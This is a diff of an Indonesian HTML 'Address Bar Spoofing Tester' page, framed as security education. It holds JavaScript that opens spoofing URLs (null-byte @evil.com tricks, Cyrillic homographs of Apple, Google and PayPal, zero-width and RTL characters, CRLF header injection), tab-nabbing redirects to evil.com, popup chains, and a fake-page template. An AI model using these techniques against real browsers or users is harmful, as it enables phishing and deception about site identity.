@@ -1,909 +1,556 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👁️ Address Bar Spoofing Tester - Ultimate Edition</title>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            color: #0f0;
-            font-family: 'SF Mono', 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
-        }
-        
-        h1 {
-            font-size: 2em;
-            text-shadow: 0 0 10px #0f0;
-            border-left: 4px solid #0f0;
-            padding-left: 20px;
-            margin: 0 0 10px 0;
-        }
-        
-        .subtitle {
-            color: #888;
-            margin-bottom: 30px;
-            padding-left: 24px;
-        }
-        
-        .warning {
-            background: rgba(255,0,0,0.2);
-            border: 1px solid #f00;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            color: #ff8888;
-        }
-        
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
-            gap: 20px;
-            margin: 20px 0;
-        }
-        
-        .card {
-            background: rgba(0,0,0,0.6);
-            border: 1px solid #0f03;
-            border-radius: 12px;
-            padding: 20px;
-            backdrop-filter: blur(5px);
-            transition: all 0.3s;
-        }
-        
-        .card:hover {
-            border-color: #0f0;
-            box-shadow: 0 0 20px rgba(0,255,0,0.2);
-        }
-        
-        .card h3 {
-            margin: 0 0 15px 0;
-            color: #ff0;
-            font-size: 1.3em;
-        }
-        
-        .card h4 {
-            margin: 10px 0;
-            color: #0fa;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 10px 16px;
-            margin: 5px;
-            cursor: pointer;
-            font-family: monospace;
-            font-size: 0.9em;
-            border-radius: 6px;
-            transition: all 0.2s;
-        }
-        
-        button:hover {
-            background: #0f0;
-            color: #000;
-            box-shadow: 0 0 10px #0f0;
-        }
-        
-        .danger-btn {
-            border-color: #f00;
-            color: #f66;
-        }
-        
-        .danger-btn:hover {
-            background: #f00;
-            color: #000;
-            box-shadow: 0 0 10px #f00;
-        }
-        
-        .code-block {
-            background: #000000aa;
-            padding: 10px;
-            border-radius: 6px;
-            font-size: 11px;
-            overflow-x: auto;
-            margin: 10px 0;
-            word-break: break-all;
-            font-family: monospace;
-            border-left: 3px solid #0f0;
-        }
-        
-        .status {
-            font-size: 12px;
-            color: #fa0;
-            margin-top: 10px;
-            padding: 5px;
-            background: #00000066;
-            border-radius: 4px;
-        }
-        
-        input, textarea {
-            background: #000000cc;
-            border: 1px solid #0f03;
-            color: #0f0;
-            padding: 8px;
-            font-family: monospace;
-            width: 100%;
-            margin: 5px 0;
-            border-radius: 4px;
-        }
-        
-        .log-panel {
-            background: #000000aa;
-            border: 1px solid #0f03;
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .log-entry {
-            font-family: monospace;
-            font-size: 12px;
-            padding: 4px;
-            border-bottom: 1px solid #0f03;
-        }
-        
-        .log-success { color: #0f0; }
-        .log-error { color: #f66; }
-        .log-info { color: #0fa; }
-        
-        .badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 10px;
-            margin-left: 10px;
-        }
-        
-        .badge-old { background: #f00; color: #fff; }
-        .badge-patched { background: #fa0; color: #000; }
-        
-        hr {
-            border-color: #0f03;
-            margin: 20px 0;
-        }
-    </style>
-</head>
-<body>
-<div class="container">
-    <h1>👁️ ADDRESS BAR SPOOFING TESTER</h1>
-    <div class="subtitle">Ultimate Collection - 50+ Teknik Absurd (Semua sudah PATCHED di browser modern)</div>
-    
-    <div class="warning">
-        ⚠️ <strong>PERINGATAN HUKUM & ETIKA</strong> ⚠️<br>
-        Tools ini untuk <strong>EDUKASI KEAMANAN</strong> dan <strong>PENELITIAN</strong> di environment sendiri.<br>
-        Semua teknik di bawah sudah <strong>DIPERBAIKI</strong> oleh Apple, Google, dan Mozilla (2024-2026).<br>
-        Menggunakan ini untuk aktivitas ilegal melanggar UU ITE dan CFAA.
-    </div>
-    
-    <!-- Control Panel -->
-    <div style="margin: 20px 0; text-align: center;">
-        <button onclick="openAllTests()">🚀 BUKA SEMUA TEST (Berbahaya untuk CPU)</button>
-        <button onclick="clearAllWindows()">🗑️ Tutup Semua Window</button>
-        <button onclick="clearLog()">📋 Clear Log</button>
-        <button onclick="generateRandomAbsurd()">🎲 Random Absurd Test</button>
-    </div>
-    
-    <div class="grid">
-        <!-- KATEGORI 1: NULL BYTE & NULL CHARACTER -->
-        <div class="card">
-            <h3>⬜ 1. NULL BYTE INJECTION <span class="badge badge-old">CVE-2016-5180</span></h3>
-            <div class="code-block">https://google.com%00@evil.com<br>
-            https://bank.com%00%00%00@attacker.com<br>
-            javascript:void(0)%00alert(1)</div>
-            <button onclick="testNullByteSimple()">Test Null Byte Sederhana</button>
-            <button onclick="testNullByteMultiple()">Test Multiple Null Bytes</button>
-            <button onclick="testNullByteUnicode()">Test Null Byte Unicode (U+0000)</button>
-            <div class="status" id="nullStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 2: PUNYCODE HOMOGRAPH -->
-        <div class="card">
-            <h3>🌐 2. PUNYCODE HOMOGRAPH <span class="badge badge-old">CVE-2017-5180</span></h3>
-            <div class="code-block">аррӏе.com (apple dengan Cyrillic)<br>
-            gооgle.com (o dengan Cyrillic)<br>
-            facebook.соm (com dengan Cyrillic)</div>
-            <button onclick="testPunycodeApple()">Test "аррӏе.com"</button>
-            <button onclick="testPunycodeGoogle()">Test "gооgle.com"</button>
-            <button onclick="testPunycodePaypal()">Test "раураl.com"</button>
-            <button onclick="testPunycodeMixed()">Test Mixed Scripts</button>
-            <div class="status" id="punyStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 3: ZERO-WIDTH & INVISIBLE -->
-        <div class="card">
-            <h3>🔍 3. ZERO-WIDTH CHARACTERS <span class="badge badge-patched">PATCHED 2024</span></h3>
-            <div class="code-block">https://google.com\u200B@evil.com<br>
-            javascript:document.title='\u200B\u200C\u200D'<br>
-            https://\u200Bbank\u200C.com</div>
-            <button onclick="testZeroWidthZWSP()">Test ZWSP (U+200B)</button>
-            <button onclick="testZeroWidthZWNJ()">Test ZWNJ (U+200C)</button>
-            <button onclick="testZeroWidthZWJ()">Test ZWJ (U+200D)</button>
-            <button onclick="testZeroWidthCombined()">Test Combined Zero-Width</button>
-            <div class="status" id="zwStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 4: CRLF / LINE BREAK -->
-        <div class="card">
-            <h3>📝 4. CRLF INJECTION <span class="badge badge-old">CVE-2018-17465</span></h3>
-            <div class="code-block">https://google.com%0d%0aX-Injected: true<br>
-            https://bank.com%0d%0a%0d%0a&lt;script&gt;</div>
-            <button onclick="testCRLFSingle()">Test Single CRLF</button>
-            <button onclick="testCRLFDouble()">Test Double CRLF</button>
-            <button onclick="testCRLFHeader()">Test Header Injection</button>
-            <div class="status" id="crlfStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 5: TAB NABBING & OPENER -->
-        <div class="card">
-            <h3>🎭 5. TAB NABBING <span class="badge badge-patched">PATCHED 2023+</span></h3>
-            <div class="code-block">window.opener.location = 'https://evil.com'<br>
-            rel=noopener bypass techniques</div>
-            <button onclick="testTabNabbingBasic()">Test Basic Tab Nabbing</button>
-            <button onclick="testTabNabbingDelay()">Test Delayed Tab Nabbing</button>
-            <button onclick="testOpenerChain()">Test Opener Chain</button>
-            <button onclick="testWindowReference()">Test Window Reference Abuse</button>
-            <div class="status" id="tabStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 6: EXTREME LENGTH / BUFFER OVERFLOW -->
-        <div class="card">
-            <h3>📏 6. EXTREME LENGTH <span class="badge badge-patched">LIMITED</span></h3>
-            <div class="code-block">https://google.com/ + "A".repeat(100000)<br>
-            about:blank# + "#".repeat(50000)</div>
-            <button onclick="testLongURL50k()">Test 50K chars</button>
-            <button onclick="testLongURL200k()">Test 200K chars</button>
-            <button onclick="testLongFragment()">Test Long Fragment (#)</button>
-            <button onclick="testExtremeRecursive()">Test Recursive Long URL</button>
-            <div class="status" id="longStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 7: SPECIAL SCHEMES -->
-        <div class="card">
-            <h3>🔧 7. BROWSER SCHEMES <span class="badge badge-patched">RESTRICTED</span></h3>
-            <div class="code-block">chrome://version<br>
-            edge://settings<br>
-            about:credits<br>
-            view-source:https://google.com</div>
-            <button onclick="testChromeScheme()">Test chrome://</button>
-            <button onclick="testEdgeScheme()">Test edge://</button>
-            <button onclick="testAboutScheme()">Test about://</button>
-            <button onclick="testViewSource()">Test view-source:</button>
-            <div class="status" id="schemeStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 8: JAVASCRIPT PSEUDO -->
-        <div class="card">
-            <h3>📜 8. JAVASCRIPT: URI <span class="badge badge-old">LEGACY</span></h3>
-            <div class="code-block">javascript:alert(document.domain)<br>
-            javascript:window.location='about:blank'</div>
-            <button onclick="testJSBasic()">Test Basic JS URI</button>
-            <button onclick="testJSRedirect()">Test JS Redirect Loop</button>
-            <button onclick="testJSDocWrite()">Test document.write</button>
-            <button onclick="testJSDataSteal()">Test Data Theft Attempt</button>
-            <div class="status" id="jsStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 9: DATA URI -->
-        <div class="card">
-            <h3>💾 9. DATA URI ATTACKS</h3>
-            <div class="code-block">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;<br>
-            data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</div>
-            <button onclick="testDataURIHTML()">Test Data URI HTML</button>
-            <button onclick="testDataURIBase64()">Test Base64 Data URI</button>
-            <button onclick="testDataURIXSS()">Test XSS via Data URI</button>
-            <div class="status" id="dataStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 10: HISTORY PUSHSTATE SPOOF -->
-        <div class="card">
-            <h3>🔄 10. HISTORY API SPOOFING</h3>
-            <div class="code-block">history.pushState({}, '', 'https://google.com')<br>
-            history.replaceState({}, '', '/fake')</div>
-            <button onclick="testPushStateSpoof()">Test PushState Spoof</button>
-            <button onclick="testReplaceStateSpoof()">Test ReplaceState</button>
-            <button onclick="testRapidPushState()">Test Rapid PushState</button>
-            <div class="status" id="historyStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 11: ABOUT:BLANK MANIPULATION -->
-        <div class="card">
-            <h3>📄 11. ABOUT:BLANK EXPLOITS</h3>
-            <div class="code-block">about:blank#SOMETHING<br>
-            about:blank?param=value</div>
-            <button onclick="testAboutBlankFragment()">Test Fragment</button>
-            <button onclick="testAboutBlankParams()">Test Parameters</button>
-            <button onclick="testAboutBlankWithIframe()">Test with Iframe</button>
-            <div class="status" id="aboutStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 12: RTL OVERRIDE -->
-        <div class="card">
-            <h3>↩️ 12. RTL OVERRIDE (U+202E)</h3>
-            <div class="code-block">https://\u202Emoc.elgoog\u202E.com<br>
-            Fake domain dengan RTL char</div>
-            <button onclick="testRTLBasic()">Test RTL Override</button>
-            <button onclick="testRTLComplex()">Test Complex RTL</button>
-            <button onclick="testRTLPDF()">Test PDF RTL</button>
-            <div class="status" id="rtlStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 13: UNICODE OVERFLOW -->
-        <div class="card">
-            <h3>🔤 13. UNICODE OVERFLOW</h3>
-            <div class="code-block">https://\uFFFF\uFFFF\uFFFF...\uFFFF.com<br>
-            Emoji dan symbol overload</div>
-            <button onclick="testUnicodeMax()">Test Max Unicode</button>
-            <button onclick="testEmojiOverload()">Test Emoji Overload</button>
-            <button onclick="testCombiningChars()">Test Combining Chars</button>
-            <div class="status" id="unicodeStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 14: POPUP BLASTER -->
-        <div class="card">
-            <h3>💥 14. POPUP CHAIN BLASTER</h3>
-            <div class="code-block">Recursive window.open<br>
-            window.open(self.location)</div>
-            <button onclick="testPopupChain()">Test Popup Chain</button>
-            <button onclick="testRecursivePopup()">Test Recursive Popup</button>
-            <button onclick="testPopupLoop()">Test Infinite Loop</button>
-            <div class="status" id="popupStatus">Ready</div>
-        </div>
-        
-        <!-- KATEGORI 15: CUSTOM PAYLOAD -->
-        <div class="card">
-            <h3>⚡ 15. CUSTOM PAYLOAD GENERATOR</h3>
-            <textarea id="customURL" rows="3" placeholder="Masukkan URL custom..."></textarea>
-            <button onclick="executeCustom()">Execute Custom</button>
-            <button onclick="generateAbsurdPayload()">Generate Absurd Payload</button>
-            <div class="status" id="customStatus">Ready</div>
-        </div>
-    </div>
-    
-    <!-- LOG PANEL -->
-    <div class="log-panel">
-        <h3>📋 EXECUTION LOG</h3>
-        <div id="logContent"></div>
-    </div>
-</div>
+<html>
+    <head>
+        <title>Address Bar Spoofing - Multiple Methods</title>
+        <style>
+            body {
+                font-family: 'Courier New', monospace;
+                background: #0a0e27;
+                color: #00ff9d;
+                padding: 20px;
+                margin: 0;
+            }
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+            h1 {
+                color: #ff3366;
+                text-align: center;
+                text-shadow: 0 0 10px rgba(255,51,102,0.5);
+            }
+            .method-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+                gap: 20px;
+                margin-top: 20px;
+            }
+            .method-card {
+                background: rgba(0,0,0,0.8);
+                border: 1px solid #00ff9d;
+                border-radius: 10px;
+                padding: 15px;
+                transition: 0.3s;
+            }
+            .method-card:hover {
+                box-shadow: 0 0 20px rgba(0,255,157,0.3);
+                transform: translateY(-5px);
+            }
+            .method-title {
+                color: #ffaa00;
+                font-size: 1.2em;
+                margin-bottom: 10px;
+                border-bottom: 1px solid #ffaa00;
+            }
+            button {
+                background: #ff3366;
+                color: white;
+                border: none;
+                padding: 8px 15px;
+                margin: 5px;
+                cursor: pointer;
+                border-radius: 5px;
+                font-family: monospace;
+                transition: 0.2s;
+            }
+            button:hover {
+                background: #ff6699;
+                transform: scale(1.05);
+            }
+            .warning {
+                background: rgba(255,51,102,0.2);
+                border: 1px solid #ff3366;
+                padding: 10px;
+                margin-top: 20px;
+                border-radius: 5px;
+                font-size: 0.8em;
+                text-align: center;
+            }
+            .info {
+                color: #88ffaa;
+                font-size: 0.8em;
+                margin-top: 10px;
+            }
+            select, input {
+                background: #1a1f3a;
+                color: #00ff9d;
+                border: 1px solid #00ff9d;
+                padding: 5px;
+                margin: 5px;
+                border-radius: 3px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔐 Address Bar Spoofing Techniques</h1>
+            <div class="warning">
+                ⚠️ EDUCATIONAL PURPOSE ONLY - These techniques demonstrate browser security concepts
+            </div>
+            
+            <div class="method-grid">
+                <!-- METHOD 1: Original Base64 Obfuscation -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 1: Base64 Obfuscation (Original)</div>
+                    <p>Menggunakan encoding base64 untuk menyembunyikan konten asli</p>
+                    <button onclick="method1_base64()">▶ Test Method 1</button>
+                    <div class="info">Teknik: Base64 encoding + window.open + setInterval redirect</div>
+                </div>
 
-<script>
-    let openWindows = [];
-    
-    function addLog(message, type = 'info') {
-        const logDiv = document.getElementById('logContent');
-        const timestamp = new Date().toLocaleTimeString();
-        let colorClass = 'log-info';
-        if (type === 'success') colorClass = 'log-success';
-        if (type === 'error') colorClass = 'log-error';
-        
-        logDiv.innerHTML = `<div class="log-entry ${colorClass}">[${timestamp}] ${message}</div>` + logDiv.innerHTML;
-        
-        // Limit log length
-        if (logDiv.children.length > 100) {
-            logDiv.removeChild(logDiv.lastChild);
-        }
-    }
-    
-    function clearLog() {
-        document.getElementById('logContent').innerHTML = '';
-        addLog('Log cleared', 'info');
-    }
-    
-    function clearAllWindows() {
-        openWindows.forEach(w => {
-            if (w && !w.closed) w.close();
-        });
-        openWindows = [];
-        addLog('All windows closed', 'success');
-    }
-    
-    function trackWindow(w, name) {
-        if (w && !w.closed) {
-            openWindows.push(w);
-            addLog(`[${name}] Window opened`, 'success');
-        } else {
-            addLog(`[${name}] Popup blocked!`, 'error');
-        }
-        return w;
-    }
-    
-    // ============ NULL BYTE TESTS ============
-    function testNullByteSimple() {
-        let url = "https://google.com%00@evil.com";
-        addLog(`Testing null byte: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Null Byte Simple");
-        if(w) addLog("Hasil: Browser modern akan encode atau reject %00", 'error');
-    }
-    
-    function testNullByteMultiple() {
-        let url = "https://bank.com" + "%00".repeat(5) + "@attacker.com";
-        addLog(`Testing multiple null bytes`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Multiple Null Byte");
-    }
-    
-    function testNullByteUnicode() {
-        let url = "https://google.com\u0000@evil.com";
-        addLog(`Testing unicode null byte: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Unicode Null Byte");
-    }
-    
-    // ============ PUNYCODE TESTS ============
-    function testPunycodeApple() {
-        let url = "https://аррӏе.com";
-        addLog(`Testing punycode apple: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Punycode Apple");
-        addLog("Browser akan menampilkan xn--80ak6aa92e.com", 'error');
-    }
-    
-    function testPunycodeGoogle() {
-        let url = "https://gооgle.com";
-        addLog(`Testing punycode google: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Punycode Google");
-    }
-    
-    function testPunycodePaypal() {
-        let url = "https://раураl.com";
-        addLog(`Testing punycode paypal: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Punycode Paypal");
-    }
-    
-    function testPunycodeMixed() {
-        let url = "https://аррӏе.gооgle.соm";
-        addLog(`Testing mixed scripts: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Mixed Punycode");
-    }
-    
-    // ============ ZERO-WIDTH TESTS ============
-    function testZeroWidthZWSP() {
-        let url = "https://google.com\u200B@evil.com";
-        addLog(`Testing ZWSP: ${escape(url)}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "ZWSP Test");
-    }
-    
-    function testZeroWidthZWNJ() {
-        let url = "https://bank\u200C.com";
-        addLog(`Testing ZWNJ`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "ZWNJ Test");
-    }
-    
-    function testZeroWidthZWJ() {
-        let url = "javascript:document.title='\u200D\u200D\u200D'";
-        addLog(`Testing ZWJ via JS protocol`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "ZWJ Test");
-    }
-    
-    function testZeroWidthCombined() {
-        let url = "https://\u200B\u200C\u200Dgoogle.com";
-        addLog(`Testing combined zero-width`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Combined Zero-Width");
-    }
-    
-    // ============ CRLF TESTS ============
-    function testCRLFSingle() {
-        let url = "https://google.com%0d%0aX-Injected: true";
-        addLog(`Testing CRLF: ${url}`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "CRLF Single");
-    }
-    
-    function testCRLFDouble() {
-        let url = "https://google.com%0d%0a%0d%0a<script>alert(1)</script>";
-        addLog(`Testing double CRLF with script`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "CRLF Double");
-    }
-    
-    function testCRLFHeader() {
-        let url = "https://bank.com%0d%0aLocation:%20https://evil.com";
-        addLog(`Testing header injection CRLF`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "CRLF Header");
-    }
-    
-    // ============ TAB NABBING ============
-    function testTabNabbingBasic() {
-        let w = window.open("https://google.com", "_blank");
-        addLog(`Testing tab nabbing - akan coba ganti location setelah 2 detik`, 'info');
-        setTimeout(() => {
-            if (w && !w.closed) {
-                try {
-                    w.location = "https://evil.com";
-                    addLog("Tab nabbing SUCCESS (browser lawas) - modern browser block", 'error');
-                } catch(e) {
-                    addLog(`Tab nabbing FAILED: ${e.message}`, 'error');
-                }
+                <!-- METHOD 2: Data URI Scheme -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 2: Data URI Scheme</div>
+                    <p>Menggunakan data: URI untuk menampilkan konten palsu</p>
+                    <button onclick="method2_dataURI()">▶ Test Method 2</button>
+                    <div class="info">Teknik: data:text/html + URL manipulation</div>
+                </div>
+
+                <!-- METHOD 3: About:Blank Hijacking -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 3: About:Blank Hijacking</div>
+                    <p>Memanfaatkan about:blank untuk spoofing</p>
+                    <button onclick="method3_aboutBlank()">▶ Test Method 3</button>
+                    <div class="info">Teknik: about:blank + document.write + history.pushState</div>
+                </div>
+
+                <!-- METHOD 4: Pop-under with Delayed Redirect -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 4: Pop-under Delayed Redirect</div>
+                    <p>Popup dengan redirect tertunda</p>
+                    <button onclick="method4_popunder()">▶ Test Method 4</button>
+                    <div class="info">Teknik: window.open + setTimeout + URL spoofing</div>
+                </div>
+
+                <!-- METHOD 5: JavaScript URI Scheme -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 5: JavaScript URI Scheme</div>
+                    <p>Menggunakan javascript: pseudo-protocol</p>
+                    <button onclick="method5_javascriptURI()">▶ Test Method 5</button>
+                    <div class="info">Teknik: javascript:void + document.write</div>
+                </div>
+
+                <!-- METHOD 6: iframe Sandbox Escape -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 6: iframe Sandbox Escape</div>
+                    <p>Manipulasi iframe untuk spoofing address bar</p>
+                    <button onclick="method6_iframe()">▶ Test Method 6</button>
+                    <div class="info">Teknik: iframe sandbox + srcdoc + navigation</div>
+                </div>
+
+                <!-- METHOD 7: History.pushState API -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 7: History.pushState Spoof</div>
+                    <p>Memanipulasi history browser</p>
+                    <button onclick="method7_pushState()">▶ Test Method 7</button>
+                    <div class="info">Teknik: history.pushState + fake URL</div>
+                </div>
+
+                <!-- METHOD 8: Window Name Propagation -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 8: Window Name Propagation</div>
+                    <p>Propagasi nama window untuk spoofing</p>
+                    <button onclick="method8_windowName()">▶ Test Method 8</button>
+                    <div class="info">Teknik: window.name + cross-window communication</div>
+                </div>
+
+                <!-- METHOD 9: Meta Refresh Timing Attack -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 9: Meta Refresh Timing</div>
+                    <p>Timing attack dengan meta refresh</p>
+                    <button onclick="method9_metaRefresh()">▶ Test Method 9</button>
+                    <div class="info">Teknik: meta refresh + rapid DOM manipulation</div>
+                </div>
+
+                <!-- METHOD 10: Blob URL Spoofing -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 10: Blob URL Spoofing</div>
+                    <p>Menggunakan Blob URLs untuk menyembunyikan asal</p>
+                    <button onclick="method10_blob()">▶ Test Method 10</button>
+                    <div class="info">Teknik: URL.createObjectURL + Blob HTML</div>
+                </div>
+            </div>
+
+            <div class="method-grid">
+                <!-- METHOD 11: PostMessage Hijacking -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 11: PostMessage Hijack</div>
+                    <p>Hijacking cross-origin communication</p>
+                    <button onclick="method11_postMessage()">▶ Test Method 11</button>
+                    <div class="info">Teknik: window.postMessage + origin spoofing</div>
+                </div>
+
+                <!-- METHOD 12: Double Redirect Chain -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 12: Double Redirect Chain</div>
+                    <p>Rantai redirect ganda untuk spoofing</p>
+                    <button onclick="method12_doubleRedirect()">▶ Test Method 12</button>
+                    <div class="info">Teknik: Multiple redirects + URL masking</div>
+                </div>
+
+                <!-- METHOD 13: Service Worker Interception -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 13: Service Worker Interception</div>
+                    <p>Intercept fetch dengan service worker</p>
+                    <button onclick="method13_serviceWorker()">▶ Test Method 13</button>
+                    <div class="info">Teknik: Service Worker + fetch interception</div>
+                </div>
+
+                <!-- METHOD 14: DOM Clobbering Attack -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 14: DOM Clobbering</div>
+                    <p>DOM clobbering untuk address bar spoof</p>
+                    <button onclick="method14_domClobber()">▶ Test Method 14</button>
+                    <div class="info">Teknik: DOM clobbering + prototype pollution</div>
+                </div>
+
+                <!-- METHOD 15: XSS with Fake Address Bar -->
+                <div class="method-card">
+                    <div class="method-title">📌 Method 15: XSS Fake Address Bar</div>
+                    <p>Membuat fake address bar dengan XSS</p>
+                    <button onclick="method15_xssFake()">▶ Test Method 15</button>
+                    <div class="info">Teknik: Injected HTML + CSS fake address bar</div>
+                </div>
+            </div>
+
+            <div class="warning">
+                <strong>🔒 Security Note:</strong> Techniques ini hanya untuk edukasi tentang browser security. 
+                Browser modern telah memblokir banyak metode ini. Selalu update browser ke versi terbaru!
+            </div>
+        </div>
+
+        <script>
+            // Common fake page template
+            function getFakePage(domain) {
+                return `<!DOCTYPE html>
+                <html>
+                <head>
+                    <title>${domain}</title>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            color: white;
+                            text-align: center;
+                            padding: 50px;
+                            margin: 0;
+                        }
+                        .spoof-card {
+                            background: rgba(255,255,255,0.95);
+                            color: #333;
+                            border-radius: 15px;
+                            padding: 30px;
+                            max-width: 500px;
+                            margin: 50px auto;
+                            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+                        }
+                        h1 { color: #ff3366; }
+                        .domain {
+                            font-family: monospace;
+                            font-size: 1.2em;
+                            color: #00aa66;
+                            word-break: break-all;
+                        }
+                        .warning {
+                            background: #ffeecc;
+                            border-left: 4px solid #ff9900;
+                            padding: 10px;
+                            margin: 20px 0;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="spoof-card">
+                        <h1>⚠️ Address Bar Spoofed!</h1>
+                        <p>You think you're on: <span class="domain">${domain}</span></p>
+                        <div class="warning">
+                            <strong>🔐 This is a demonstration!</strong><br>
+                            The address bar has been manipulated to show a fake URL.
+                        </div>
+                        <p>Technique: ${getCurrentTechnique()}</p>
+                        <button onclick="window.close()">Close</button>
+                    </div>
+                    <script>
+                        // Anti-close protection simulation
+                        window.onbeforeunload = function() {
+                            return "Are you sure?";
+                        };
+                    <\/script>
+                </body>
+                </html>`;
             }
-        }, 2000);
-        trackWindow(w, "Tab Nabbing");
-    }
-    
-    function testTabNabbingDelay() {
-        let w = window.open("https://google.com", "_blank");
-        let counter = 0;
-        let interval = setInterval(() => {
-            if (w && !w.closed && counter > 5) {
-                try {
-                    w.location = "https://evil.com";
-                    addLog("Delayed tab nabbing attempted", 'info');
-                    clearInterval(interval);
-                } catch(e) {}
+
+            function getCurrentTechnique() {
+                return window.currentTechnique || "Unknown";
             }
-            counter++;
-        }, 1000);
-        trackWindow(w, "Delayed Tab Nabbing");
-    }
-    
-    function testOpenerChain() {
-        let w1 = window.open("about:blank", "_blank");
-        w1.document.write(`
-            <html>
-            <body>
-                <h3>Chain Test</h3>
-                <button onclick="window.open('https://google.com','_blank')">Open Level 2</button>
-                <script>
-                    window.level2 = window.open('about:blank', '_blank');
-                    setTimeout(() => {
-                        try { opener.location = 'https://evil.com'; } catch(e) {}
-                    }, 1000);
-                <\/script>
-            </body>
-            </html>
-        `);
-        trackWindow(w1, "Opener Chain");
-    }
-    
-    function testWindowReference() {
-        let w = window.open("about:blank", "_blank");
-        addLog(`Testing window reference abuse`, 'info');
-        setTimeout(() => {
-            try {
-                w.opener = window;
-                w.location = "javascript:alert('test')";
-                addLog("Window reference manipulated", 'info');
-            } catch(e) {
-                addLog(`Failed: ${e.message}`, 'error');
-            }
-        }, 1000);
-        trackWindow(w, "Window Reference");
-    }
-    
-    // ============ EXTREME LENGTH ============
-    function testLongURL50k() {
-        let longString = "A".repeat(50000);
-        let url = `https://google.com/${longString}`;
-        addLog(`Testing URL with 50,000 characters`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "50K URL");
-    }
-    
-    function testLongURL200k() {
-        let longString = "A".repeat(200000);
-        let url = `https://google.com/${longString}`;
-        addLog(`Testing URL with 200,000 characters`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "200K URL");
-    }
-    
-    function testLongFragment() {
-        let fragment = "#" + "A".repeat(100000);
-        let url = `https://google.com${fragment}`;
-        addLog(`Testing long fragment: ${url.length} chars`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Long Fragment");
-    }
-    
-    function testExtremeRecursive() {
-        let url = "https://google.com/" + "very/long/path/".repeat(1000);
-        addLog(`Testing recursive long path`, 'info');
-        let w = window.open(url, "_blank");
-        trackWindow(w, "Recursive Long URL");
-    }
-    
-    // ============ BROWSER SCHEMES ============
-    function testChromeScheme() {
-        let w = window.open("chrome://version", "_blank");
-        if(!w) addLog("chrome:// scheme blocked by browser", 'error');
-        trackWindow(w, "Chrome Scheme");
-    }
-    
-    function testEdgeScheme() {
-        let w = window.open("edge://settings", "_blank");
-        trackWindow(w, "Edge Scheme");
-    }
-    
-    function testAboutScheme() {
-        let w = window.open("about:credits", "_blank");
-        trackWindow(w, "About Scheme");
-    }
-    
-    function testViewSource() {
-        let w = window.open("view-source:https://google.com", "_blank");
-        trackWindow(w, "View Source");
-    }
-    
-    // ============ JAVASCRIPT PROTOCOL ============
-    function testJSBasic() {
